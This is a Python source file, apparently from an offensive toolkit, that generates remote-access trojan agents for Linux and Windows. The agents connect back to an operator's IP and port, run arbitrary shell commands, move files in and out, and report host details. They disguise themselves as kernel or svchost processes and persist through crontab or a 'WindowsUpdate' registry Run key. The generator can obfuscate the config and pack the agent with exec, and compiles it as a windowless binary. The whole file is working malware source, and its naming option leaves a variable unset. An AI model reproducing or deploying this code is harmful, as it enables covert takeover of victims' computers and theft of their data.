import base64
import os
import random
import shutil
import subprocess as _subprocess
import sys
import zlib

from modules.crypto import generate_key

_CONFIG_PLAIN = '''IP = "{IP}"
PORT = {PORT}
KEY = b"{KEY}"
'''

_CONFIG_XOR = '''import base64 as _b
_XOR = 0x{XOR_KEY:02x}
_RAW = _b.b64decode("{CONFIG_B64}")
_DEC = bytes(b ^ _XOR for b in _RAW).decode().split("|")
IP = _DEC[0]
PORT = int(_DEC[1])
KEY = _DEC[2].encode()
del _XOR, _RAW, _DEC, _b
'''

AGENT_LINUX_TEMPLATE = '''#!/usr/bin/env python3
import base64 as _b64
import os
import socket
import subprocess
import sys
import time

from cryptography.fernet import Fernet

# ---------- config ----------
{CONFIG_BLOCK}

# ---------- crypto ----------
def _enc(data):
    if isinstance(data, str):
        data = data.encode()
    return Fernet(KEY).encrypt(data)

def _dec(data):
    return Fernet(KEY).decrypt(data)

def _send(s, data):
    if isinstance(data, str):
        data = data.encode()
    p = _enc(data)
    s.sendall(len(p).to_bytes(4, "big") + p)

def _recv(s):
    h = s.recv(4)
    if not h:
        return None
    n = int.from_bytes(h, "big")
    d = b""
    while len(d) < n:
        c = s.recv(n - len(d))
        if not c:
            return None
        d += c
    return _dec(d)

# ---------- stealth ----------
def _stealth():
    try:
        import setproctitle
        setproctitle.setproctitle("[kworker/0:0]")
    except Exception:
        try:
            sys.argv[0] = "[kworker/0:0]"
        except Exception:
            pass

# ---------- persistence ----------
def _persist():
    try:
        p = os.path.abspath(sys.argv[0])
        e = ""
        try:
            e = subprocess.check_output(
                ["crontab", "-l"], stderr=subprocess.DEVNULL, text=True
            )
        except Exception:
            pass
        if "@reboot" in e and p in e:
            return
        l = "@reboot python3 " + p + " >/dev/null 2>&1\\n"
        t = "/tmp/.sysd"
        with open(t, "w") as f:
            f.write(e + l)
        subprocess.run(["crontab", t], capture_output=True, stderr=subprocess.DEVNULL)
        try:
            os.remove(t)
        except Exception:
            pass
    except Exception:
        pass

def _remove_persist():
    try:
        p = os.path.abspath(sys.argv[0])
        e = ""
        try:
            e = subprocess.check_output(
                ["crontab", "-l"], stderr=subprocess.DEVNULL, text=True
            )
        except Exception:
            pass
        lines = [l for l in e.split("\\n") if p not in l]
        t = "/tmp/.sysd_rm"
        with open(t, "w") as f:
            f.write("\\n".join(lines))
        subprocess.run(["crontab", t], capture_output=True, stderr=subprocess.DEVNULL)
        try:
            os.remove(t)
        except Exception:
            pass
    except Exception:
        pass

# ---------- command handler ----------
def _special(cmd, s):
    if cmd == "__ping__":
        _send(s, "__pong__")
        return True

    if cmd.startswith("__download__|"):
        path = cmd[13:]
        try:
            with open(path, "rb") as f:
                b = _b64.b64encode(f.read()).decode()
            _send(s, b)
        except Exception as e:
            _send(s, "__error__|" + str(e))
        return True

    if cmd.startswith("__upload__|"):
        parts = cmd.split("|", 2)
        if len(parts) < 3:
            _send(s, "__error__|invalid format")
            return True
        try:
            raw = _b64.b64decode(parts[2])
            d = os.path.dirname(parts[1])
            if d:
                os.makedirs(d, exist_ok=True)
            with open(parts[1], "wb") as f:
                f.write(raw)
            _send(s, "__ok__|" + str(len(raw)) + " bytes")
        except Exception as e:
            _send(s, "__error__|" + str(e))
        return True

    if cmd == "__selfdestruct__":
        _remove_persist()
        try:
            os.remove(sys.argv[0])
        except Exception:
            pass
        _send(s, "__selfdestruct__ok__")
        s.close()
        sys.exit(0)

    if cmd == "__info__":
        import uuid
        i = "|".join([
            sys.platform,
            os.name,
            os.getcwd(),
            os.path.expanduser("~"),
            os.getenv("USER", "unknown"),
            socket.gethostname(),
            str(uuid.uuid4()),
        ])
        _send(s, i)
        return True

    return False

# ---------- connect ----------
def _connect():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(60)
            s.connect((IP, PORT))
            _send(s, "beacon")
            while True:
                try:
                    d = _recv(s)
                    if d is None:
                        break
                    cmd = d.decode()
                    if _special(cmd, s):
                        continue
                    r = subprocess.run(
                        ["/bin/sh", "-c", cmd],
                        capture_output=True,
                        timeout=60,
                    )
                    out = r.stdout + r.stderr
                    if not out:
                        out = b"[OK]\\n"
                    _send(s, out)
                except subprocess.TimeoutExpired:
                    try:
                        _send(s, "[!] timeout")
                    except Exception:
                        pass
                    break
                except Exception:
                    break
            s.close()
        except Exception:
            pass
        time.sleep(30)

if __name__ == "__main__":
    _stealth()
    _persist()
    _connect()
'''

AGENT_WINDOWS_TEMPLATE = '''#!/usr/bin/env python3
import base64 as _b64
import ctypes
import os
import socket
import subprocess
import sys
import time

from cryptography.fernet import Fernet

# ---------- config ----------
{CONFIG_BLOCK}

# ---------- crypto ----------
def _enc(data):
    if isinstance(data, str):
        data = data.encode()
    return Fernet(KEY).encrypt(data)

def _dec(data):
    return Fernet(KEY).decrypt(data)

def _send(s, data):
    if isinstance(data, str):
        data = data.encode()
    p = _enc(data)
    s.sendall(len(p).to_bytes(4, "big") + p)

def _recv(s):
    h = s.recv(4)
    if not h:
        return None
    n = int.from_bytes(h, "big")
    d = b""
    while len(d) < n:
        c = s.recv(n - len(d))
        if not c:
            return None
        d += c
    return _dec(d)

# ---------- stealth ----------
def _stealth():
    try:
        ctypes.windll.kernel32.SetConsoleTitleW("svchost.exe")
    except Exception:
        try:
            sys.argv[0] = "svchost.exe"
        except Exception:
            pass

# ---------- persistence ----------
def _persist():
    try:
        p = os.path.abspath(sys.argv[0])
        k = r"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        v = '"' + sys.executable + '" "' + p + '"'
        subprocess.run(
            ["reg", "add", k, "/v", "WindowsUpdate", "/d", v, "/f"],
            capture_output=True, stderr=subprocess.DEVNULL,
        )
    except Exception:
        pass

def _remove_persist():
    try:
        k = r"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        subprocess.run(
            ["reg", "delete", k, "/v", "WindowsUpdate", "/f"],
            capture_output=True, stderr=subprocess.DEVNULL,
        )
    except Exception:
        pass

# ---------- command handler ----------
def _special(cmd, s):
    if cmd == "__ping__":
        _send(s, "__pong__")
        return True

    if cmd.startswith("__download__|"):
        path = cmd[13:]
        try:
            with open(path, "rb") as f:
                b = _b64.b64encode(f.read()).decode()
            _send(s, b)
        except Exception as e:
            _send(s, "__error__|" + str(e))
        return True

    if cmd.startswith("__upload__|"):
        parts = cmd.split("|", 2)
        if len(parts) < 3:
            _send(s, "__error__|invalid format")
            return True
        try:
            raw = _b64.b64decode(parts[2])
            d = os.path.dirname(parts[1])
            if d:
                os.makedirs(d, exist_ok=True)
            with open(parts[1], "wb") as f:
                f.write(raw)
            _send(s, "__ok__|" + str(len(raw)) + " bytes")
        except Exception as e:
            _send(s, "__error__|" + str(e))
        return True

    if cmd == "__selfdestruct__":
        _remove_persist()
        try:
            os.remove(sys.argv[0])
        except Exception:
            pass
        _send(s, "__selfdestruct__ok__")
        s.close()
        sys.exit(0)

    if cmd == "__info__":
        import uuid
        i = "|".join([
            sys.platform,
            os.name,
            os.getcwd(),
            os.path.expanduser("~"),
            os.getenv("USERNAME", "unknown"),
            socket.gethostname(),
            str(uuid.uuid4()),
        ])
        _send(s, i)
        return True

    return False

# ---------- connect ----------
def _connect():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(60)
            s.connect((IP, PORT))
            _send(s, "beacon")
            while True:
                try:
                    d = _recv(s)
                    if d is None:
                        break
                    cmd = d.decode()
                    if _special(cmd, s):
                        continue
                    r = subprocess.run(
                        ["cmd.exe", "/c", cmd],
                        capture_output=True,
                        timeout=60,
                        creationflags=0x08000000,
                    )
                    out = r.stdout + r.stderr
                    if not out:
                        out = b"[OK]\\r\\n"
                    _send(s, out)
                except subprocess.TimeoutExpired:
                    try:
                        _send(s, "[!] timeout")
                    except Exception:
                        pass
                    break
                except Exception:
                    break
            s.close()
        except Exception:
            pass
        time.sleep(30)

if __name__ == "__main__":
    _stealth()
    _persist()
    _connect()
'''


def _build_config_block(ip, port, key_str, obfuscation):
    if obfuscation == "xor":
        xor_key = random.randint(1, 254)
        config_str = f"{ip}|{port}|{key_str}"
        obf = bytes(b ^ xor_key for b in config_str.encode())
        config_b64 = base64.b64encode(obf).decode()
        return _CONFIG_XOR.format(XOR_KEY=xor_key, CONFIG_B64=config_b64), True
    else:
        return _CONFIG_PLAIN.format(IP=ip, PORT=port, KEY=key_str), False


def _generate_agent_code(ip, port, os_type, key, obfuscation):
    key_str = key.decode()
    config_block, is_obf = _build_config_block(ip, port, key_str, obfuscation)

    if os_type == "linux":
        code = AGENT_LINUX_TEMPLATE.replace("{CONFIG_BLOCK}", config_block)
    else:
        code = AGENT_WINDOWS_TEMPLATE.replace("{CONFIG_BLOCK}", config_block)

    return code


def obfuscate_packed(code):
    compressed = zlib.compress(code.encode())
    b64 = base64.b64encode(compressed).decode()

    stub = '#!/usr/bin/env python3\nimport zlib as _z, base64 as _b\nexec(_z.decompress(_b.b64decode("' + b64 + '")))\n'
    return stub


def _can_compile(target_os):
    host = sys.platform.lower()
    if target_os == "windows" and not host.startswith("win"):
        return False, "Cannot compile Windows .exe from Linux. Use PyInstaller on a Windows machine, or just use the .py file."
    if target_os == "linux" and host.startswith("win"):
        return False, "Cannot compile Linux binary from Windows. Use PyInstaller on a Linux machine, or just use the .py file."
    return True, None


def try_compile_exe(py_path, output_dir="payloads", verbose=True):
    pyinstaller = shutil.which("pyinstaller")
    if not pyinstaller:
        if verbose:
            print("  [!] PyInstaller not found. Install with: pip install pyinstaller")
        return None

    name = os.path.splitext(os.path.basename(py_path))[0]
    try:
        result = _subprocess.run(
            [
                pyinstaller,
                "--onefile",
                "--noconsole",
                "--distpath",
                output_dir,
                "--name",
                name,
                py_path,
            ],
            capture_output=True,
            text=True,
            timeout=180,
        )

        if result.returncode != 0:
            if verbose:
                err = result.stderr.strip() or result.stdout.strip()
                print(f"  [!] PyInstaller error: {err[:500]}")
            return None

        expected = os.path.join(output_dir, name)
        if os.path.exists(expected):
            return expected
        expected_exe = expected + ".exe"
        if os.path.exists(expected_exe):
            return expected_exe

        for f in os.listdir(output_dir):
            fp = os.path.join(output_dir, f)
            if os.path.isfile(fp) and (f == name or f == name + ".exe"):
                os.chmod(fp, 0o755)
                return fp

        if verbose:
            print(f"  [!] Binary not found after compilation")
            print(f"  [!] Check {output_dir}/ for output files")
        return None

    except _subprocess.TimeoutExpired:
        if verbose:
            print("  [!] PyInstaller timed out (3 min)")
        return None
    except Exception as e:
        if verbose:
            print(f"  [!] Compilation error: {e}")
        return None
    finally:
        for p in ["build", name + ".spec"]:
            pth = os.path.join(os.getcwd(), p)
            if os.path.exists(pth):
                if os.path.isdir(pth):
                    shutil.rmtree(pth, ignore_errors=True)
                else:
                    try:
                        os.remove(pth)
                    except Exception:
                        pass


def generate_payload(ip, port, os_type="linux", key=None, obfuscation="none", compile_exe=False, output_dir="payloads", name=None):
    if key is None:
        key = generate_key()

    if os_type not in ("linux", "windows"):
        os_type = "linux"

    if obfuscation not in ("none", "xor", "packed"):
        obfuscation = "none"

    prefix = "agent_linux" if os_type == "linux" else "agent_windows"
    safe_ip = ip.replace(".", "_").replace(":", "_")

    if name:
        filename = name if name.endswith(".py") else name + ".py"
    elif obfuscation == "packed":
        plain_code = _generate_agent_code(ip, port, os_type, key, "none")
        code = obfuscate_packed(plain_code)
        filename = f"{prefix}_{safe_ip}_{port}_packed.py"
    else:
        code = _generate_agent_code(ip, port, os_type, key, obfuscation)
        suffix = "_obf" if obfuscation == "xor" else ""
        filename = f"{prefix}_{safe_ip}_{port}{suffix}.py"

    os.makedirs(output_dir, exist_ok=True)
    filepath = os.path.join(output_dir, filename)

    with open(filepath, "w") as f:
        f.write(code)

    os.chmod(filepath, 0o755)

    exe_path = None
    if compile_exe:
        ok, msg = _can_compile(os_type)
        if ok:
            print("  [*] Compiling to binary with PyInstaller...")
            exe_path = try_compile_exe(filepath, output_dir)
        elif not ok:
            print(f"  [!] {msg}")

    ext = ".exe" if os_type == "windows" and exe_path and not exe_path.endswith(".exe") else ""
    if exe_path and ext:
        actual = exe_path + ext
        if os.path.exists(actual):
            exe_path = actual

    return filepath, key.decode(), exe_path
